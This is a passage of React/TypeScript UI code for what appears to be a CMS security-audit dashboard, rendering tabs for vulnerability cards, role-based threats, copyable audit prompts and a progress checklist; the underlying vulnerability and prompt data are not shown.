        borderRadius: 14, padding: 4,
        border: '1px solid rgba(255,255,255,0.05)',
      }}>
        {tabs.map(t => (
          <button
            key={t.key}
            onClick={() => setActiveTab(t.key)}
            style={{
              flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 7,
              padding: '10px 14px', borderRadius: 10,
              fontSize: 13, fontWeight: 500, cursor: 'pointer', border: 'none',
              background: activeTab === t.key ? 'rgba(251,191,36,0.15)' : 'transparent',
              color: activeTab === t.key ? '#fef08a' : '#71717a',
              transition: 'all 0.15s ease',
            }}
          >
            {t.icon}
            <span>{t.label}</span>
            {t.count !== undefined && (
              <span style={{
                fontSize: 10, fontWeight: 600,
                background: activeTab === t.key ? 'rgba(251,191,36,0.2)' : 'rgba(255,255,255,0.06)',
                color: activeTab === t.key ? '#fef08a' : '#64748b',
                padding: '2px 7px', borderRadius: 99,
              }}>
                {t.count}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* ━━━ TAB: Vulnerabilities ━━━━━━━━━ */}
      {activeTab === 'vulns' && (
        <div className="anim-card">
          {/* Filter chips */}
          <div style={{ display: 'flex', gap: 8, marginBottom: 18, flexWrap: 'wrap' }}>
            {(['all','C','H','M','L'] as FilterKey[]).map(f => {
              const isActive = filter === f;
              const cfg = f === 'all' ? { label: 'All', color: '#fbbf24', bg: 'rgba(251,191,36,0.12)', border: 'rgba(251,191,36,0.3)' } : SEV_CONFIG[f as Severity];
              return (
                <button
                  key={f}
                  className="sev-filter"
                  onClick={() => setFilter(f)}
                  style={{
                    display: 'inline-flex', alignItems: 'center', gap: 5,
                    padding: '5px 12px', borderRadius: 99,
                    fontSize: 12, fontWeight: 600,
                    background: isActive ? cfg.bg : 'rgba(255,255,255,0.04)',
                    color: isActive ? cfg.color : '#64748b',
                    border: `1px solid ${isActive ? cfg.border : 'rgba(255,255,255,0.06)'}`,
                  }}
                >
                  {cfg.label}
                  {f !== 'all' && <span style={{ fontSize: 10 }}>({sevCounts[f as Severity]})</span>}
                </button>
              );
            })}
          </div>

          {/* Vulnerability list */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            {filteredVulns.map(v => {
              const cfg = SEV_CONFIG[v.sev];
              const isExpanded = expandedVuln === v.id;
              return (
                <div
                  key={v.id}
                  className="sa-glass vuln-card"
                  onClick={() => setExpandedVuln(isExpanded ? null : v.id)}
                  style={{ padding: 0, borderLeft: `3px solid ${cfg.color}` }}
                >
                  {/* Header */}
                  <div style={{ padding: '14px 18px', display: 'flex', alignItems: 'center', gap: 12 }}>
                    <span style={{
                      display: 'inline-flex', alignItems: 'center', gap: 4,
                      padding: '3px 9px', borderRadius: 99,
                      fontSize: 10, fontWeight: 700, letterSpacing: '0.04em', textTransform: 'uppercase',
                      background: cfg.bg, color: cfg.color, border: `1px solid ${cfg.border}`,
                      boxShadow: `0 0 10px ${cfg.glow}`,
                      flexShrink: 0,
                    }}>
                      {cfg.label}
                    </span>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontSize: 14, fontWeight: 600, color: '#f1f5f9' }}>{v.title}</div>
                      <div style={{ fontSize: 11, color: '#64748b', marginTop: 2 }}>
                        <span style={{ color: '#94a3b8' }}>Area:</span> {v.area}
                      </div>
                    </div>
                    <div style={{ color: '#475569', transition: 'transform 0.2s', transform: isExpanded ? 'rotate(180deg)' : 'none' }}>
                      <ChevronDown size={16} />
                    </div>
                  </div>

                  {/* Expanded Details */}
                  {isExpanded && (
                    <div className="vuln-details" style={{ padding: '0 18px 18px', borderTop: '1px solid rgba(255,255,255,0.04)' }}>
                      <div style={{ paddingTop: 14, display: 'grid', gap: 14 }}>
                        {/* Impact */}
                        <div style={{ background: 'rgba(239,68,68,0.04)', borderRadius: 10, padding: '10px 14px', borderLeft: '3px solid rgba(239,68,68,0.3)' }}>
                          <div style={{ fontSize: 10, fontWeight: 600, color: '#f87171', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 4 }}>Impact</div>
                          <div style={{ fontSize: 12.5, color: '#e2e8f0', lineHeight: 1.5 }}>{v.impact}</div>
                        </div>

                        {/* Attack Scenario */}
                        <div>
                          <div style={{ fontSize: 10, fontWeight: 600, color: '#fb923c', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 6 }}>Attack Scenario</div>
                          <div style={{ fontSize: 12.5, color: '#cbd5e1', lineHeight: 1.6, background: 'rgba(255,255,255,0.02)', padding: '10px 12px', borderRadius: 8, border: '1px solid rgba(255,255,255,0.04)' }}>
                            {v.attack}
                          </div>
                        </div>

                        {/* Root Cause */}
                        <div>
                          <div style={{ fontSize: 10, fontWeight: 600, color: '#60a5fa', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 6 }}>Root Cause</div>
                          <div style={{ fontSize: 12.5, color: '#cbd5e1', lineHeight: 1.5 }}>{v.root}</div>
                        </div>

                        {/* Fix */}
                        <div style={{ background: 'rgba(16,185,129,0.04)', borderRadius: 10, padding: '10px 14px', borderLeft: '3px solid rgba(16,185,129,0.3)' }}>
                          <div style={{ fontSize: 10, fontWeight: 600, color: '#34d399', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 4 }}>Recommended Fix</div>
                          <div style={{ fontSize: 12.5, color: '#e2e8f0', lineHeight: 1.5 }}>{v.fix}</div>
                        </div>

                        {/* Tests */}
                        <div>
                          <div style={{ fontSize: 10, fontWeight: 600, color: '#a78bfa', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 8 }}>Test Cases</div>
                          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                            {v.tests.map((t, ti) => (
                              <div key={ti} style={{
                                display: 'flex', alignItems: 'flex-start', gap: 8,
                                fontSize: 12, color: '#94a3b8', lineHeight: 1.5,
                                padding: '6px 10px', borderRadius: 6,
                                background: 'rgba(139,92,246,0.04)',
                                border: '1px solid rgba(139,92,246,0.1)',
                              }}>
                                <Terminal size={12} style={{ marginTop: 2, flexShrink: 0, color: '#8b5cf6' }} />
                                <span style={{ fontFamily: 'monospace', fontSize: 11.5 }}>{t}</span>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ━━━ TAB: Role Threats ━━━━━━━━━━━━ */}
      {activeTab === 'roles' && (
        <div className="anim-card">
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 10, marginBottom: 24 }}>
            {ROLES.map((r, i) => (
              <div
                key={i}
                id={`role-${i}`}
                className={`sa-glass role-card-sa ${selectedRole === i ? 'selected' : ''}`}
                onClick={() => setSelectedRole(selectedRole === i ? null : i)}
                style={{ padding: '14px 16px' }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
                  <div style={{
                    width: 34, height: 34, borderRadius: 10,
                    background: selectedRole === i ? 'rgba(251,191,36,0.15)' : 'rgba(255,255,255,0.05)',
                    border: `1px solid ${selectedRole === i ? 'rgba(251,191,36,0.3)' : 'rgba(255,255,255,0.08)'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    color: selectedRole === i ? '#fbbf24' : '#94a3b8',
                    transition: 'all 0.2s ease',
                  }}>
                    {ROLE_ICONS[r.icon] || <Users size={18} />}
                  </div>
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 600, color: '#f1f5f9' }}>{r.name}</div>
                    <div style={{ fontSize: 10, color: '#64748b' }}>{r.desc}</div>
                  </div>
                </div>
                <div style={{ display: 'flex', gap: 4, marginTop: 8 }}>
                  {r.threats.map((t, ti) => {
                    const cfg = SEV_CONFIG[t.sev];
                    return (
                      <div key={ti} style={{
                        width: 8, height: 8, borderRadius: '50%',
                        background: cfg.color, opacity: 0.8,
                      }} title={cfg.label} />
                    );
                  })}
                </div>
              </div>
            ))}
          </div>

          {/* Role Detail Panel */}
          {selectedRole !== null ? (
            <div className="sa-glass" style={{ padding: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 18, borderBottom: '1px solid rgba(255,255,255,0.05)', paddingBottom: 14 }}>
                <div style={{
                  width: 42, height: 42, borderRadius: 12,
                  background: 'linear-gradient(135deg, rgba(251,191,36,0.12), rgba(249,115,22,0.08))',
                  border: '1px solid rgba(251,191,36,0.25)',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  color: '#fbbf24',
                }}>
                  {ROLE_ICONS[ROLES[selectedRole].icon] || <Users size={20} />}
                </div>
                <div>
                  <div style={{ fontSize: 17, fontWeight: 700, color: '#f1f5f9' }}>{ROLES[selectedRole].name}</div>
                  <div style={{ fontSize: 12, color: '#64748b' }}>{ROLES[selectedRole].desc}</div>
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                {ROLES[selectedRole].threats.map((t, ti) => {
                  const cfg = SEV_CONFIG[t.sev];
                  return (
                    <div key={ti} style={{
                      display: 'flex', gap: 12, alignItems: 'flex-start',
                      padding: '12px 14px', borderRadius: 10,
                      background: 'rgba(255,255,255,0.02)',
                      border: '1px solid rgba(255,255,255,0.04)',
                      borderLeft: `3px solid ${cfg.color}`,
                    }}>
                      <span style={{
                        display: 'inline-flex', alignItems: 'center',
                        padding: '2px 8px', borderRadius: 99,
                        fontSize: 9, fontWeight: 700, letterSpacing: '0.04em', textTransform: 'uppercase',
                        background: cfg.bg, color: cfg.color, border: `1px solid ${cfg.border}`,
                        flexShrink: 0, marginTop: 1,
                      }}>
                        {cfg.label}
                      </span>
                      <div style={{ fontSize: 13, color: '#cbd5e1', lineHeight: 1.5 }}>{t.text}</div>
                    </div>
                  );
                })}
              </div>
            </div>
          ) : (
            <div className="sa-glass" style={{ padding: 40, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 10 }}>
              <Users size={28} style={{ color: '#475569', opacity: 0.4 }} />
              <div style={{ fontSize: 13, color: '#475569' }}>Select a role above to see its specific threat scenarios.</div>
            </div>
          )}
        </div>
      )}

      {/* ━━━ TAB: Audit Prompts ━━━━━━━━━━━ */}
      {activeTab === 'prompts' && (
        <div className="anim-card" style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
          <div style={{
            padding: '12px 16px', borderRadius: 10,
            background: 'rgba(251,191,36,0.05)', border: '1px solid rgba(251,191,36,0.12)',
            fontSize: 12, color: '#d4a017', display: 'flex', alignItems: 'center', gap: 8,
            marginBottom: 4,
          }}>
            <Zap size={14} />
            <span>Copy these prompts into ChatGPT / Claude / Gemini to audit your CMS codebase. Replace [bracketed] placeholders with your actual file paths.</span>
          </div>

          {PROMPTS.map((p, pi) => (
            <div key={pi} className="sa-glass prompt-card" style={{ padding: 0, overflow: 'hidden' }}>
              <div style={{
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                padding: '14px 18px',
                borderBottom: '1px solid rgba(255,255,255,0.04)',
                background: 'rgba(255,255,255,0.015)',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                  <div style={{
                    width: 34, height: 34, borderRadius: 9,
                    background: 'rgba(251,191,36,0.08)',
                    border: '1px solid rgba(251,191,36,0.15)',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    color: '#fbbf24',
                  }}>
                    {PROMPT_ICONS[p.icon] || <Terminal size={16} />}
                  </div>
                  <span style={{ fontSize: 14, fontWeight: 600, color: '#f1f5f9' }}>{p.area}</span>
                </div>
                <button
                  onClick={() => handleCopyPrompt(pi, p.prompt)}
                  style={{
                    display: 'inline-flex', alignItems: 'center', gap: 6,
                    padding: '6px 14px', borderRadius: 8, cursor: 'pointer',
                    fontSize: 12, fontWeight: 500, border: 'none',
                    background: copiedPrompt === pi ? 'rgba(16,185,129,0.15)' : 'rgba(251,191,36,0.1)',
                    color: copiedPrompt === pi ? '#34d399' : '#fbbf24',
                    transition: 'all 0.2s ease',
                  }}
                >
                  {copiedPrompt === pi ? <Check size={13} /> : <Copy size={13} />}
                  {copiedPrompt === pi ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <div style={{ padding: '14px 18px' }}>
                <pre style={{
                  fontSize: 12, color: '#94a3b8', lineHeight: 1.7,
                  fontFamily: '"JetBrains Mono", "Fira Code", monospace',
                  whiteSpace: 'pre-wrap', wordBreak: 'break-word',
                  margin: 0,
                  background: 'rgba(0,0,0,0.2)',
                  padding: '14px 16px', borderRadius: 10,
                  border: '1px solid rgba(255,255,255,0.04)',
                  maxHeight: 280, overflowY: 'auto',
                }}>
                  {p.prompt}
                </pre>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* ━━━ TAB: Quick Checklist ━━━━━━━━━ */}
      {activeTab === 'checks' && (
        <div className="anim-card">
          {/* Progress bar */}
          <div className="sa-glass" style={{ padding: '16px 20px', marginBottom: 18 }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <ShieldCheck size={16} style={{ color: checkProgress >= 100 ? '#34d399' : '#fbbf24' }} />
                <span style={{ fontSize: 14, fontWeight: 600, color: '#f1f5f9' }}>Audit Progress</span>
              </div>
              <span style={{
                fontSize: 13, fontWeight: 700,
                color: checkProgress >= 100 ? '#34d399' : checkProgress >= 50 ? '#fbbf24' : '#f87171',
              }}>
                {checkedCount}/{totalChecks} — {checkProgress}%
              </span>
            </div>
            <div style={{ height: 6, borderRadius: 3, background: 'rgba(255,255,255,0.06)', overflow: 'hidden' }}>
              <div style={{
                height: '100%', borderRadius: 3,
                background: checkProgress >= 100
                  ? 'linear-gradient(90deg, #10b981, #34d399)'
                  : checkProgress >= 50
                    ? 'linear-gradient(90deg, #fbbf24, #f59e0b)'
                    : 'linear-gradient(90deg, #ef4444, #f87171)',
                width: `${checkProgress}%`,
                transition: 'width 0.5s ease',
              }} />
            </div>
          </div>

          {/* Checklist categories */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
            {CHECKS.map((cat, ci) => {
              const catChecked = cat.items.filter((_, ii) => checkState[`${ci}-${ii}`]).length;
              const catDone = catChecked === cat.items.length;
              return (
                <div key={ci} className="sa-glass" style={{ padding: 0, overflow: 'hidden' }}>
                  <div style={{
                    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    padding: '14px 18px',
                    background: catDone ? 'rgba(16,185,129,0.04)' : 'rgba(255,255,255,0.015)',
                    borderBottom: '1px solid rgba(255,255,255,0.04)',
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                      {catDone
                        ? <CheckCircle2 size={16} style={{ color: '#34d399' }} />
                        : <Circle size={16} style={{ color: '#475569' }} />
                      }
                      <span style={{
                        fontSize: 14, fontWeight: 600,
                        color: catDone ? '#34d399' : '#f1f5f9',
                      }}>
                        {cat.cat}
                      </span>
                    </div>
                    <span style={{
                      fontSize: 11, fontWeight: 600,
                      background: catDone ? 'rgba(16,185,129,0.12)' : 'rgba(255,255,255,0.06)',
                      color: catDone ? '#34d399' : '#64748b',
                      padding: '3px 9px', borderRadius: 99,
                    }}>
                      {catChecked}/{cat.items.length}
                    </span>
                  </div>
                  <div>
                    {cat.items.map((item, ii) => {
                      const key = `${ci}-${ii}`;
                      const isChecked = !!checkState[key];
                      return (
                        <div
                          key={ii}
                          className="check-item"
                          onClick={() => toggleCheck(key)}
                          style={{
                            display: 'flex', alignItems: 'flex-start', gap: 10,
                            padding: '10px 18px', cursor: 'pointer',
                            borderBottom: ii < cat.items.length - 1 ? '1px solid rgba(255,255,255,0.03)' : 'none',
                          }}
                        >
                          <input
                            type="checkbox"
                            checked={isChecked}
                            onChange={() => toggleCheck(key)}
                            onClick={e => e.stopPropagation()}
                            style={{ marginTop: 2, flexShrink: 0 }}
                          />
                          <span style={{
                            fontSize: 13, lineHeight: 1.5,
                            color: isChecked ? '#64748b' : '#cbd5e1',
                            textDecoration: isChecked ? 'line-through' : 'none',
                            transition: 'all 0.15s ease',
                          }}>
                            {item}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}
    </DashboardLayout>
  );
}
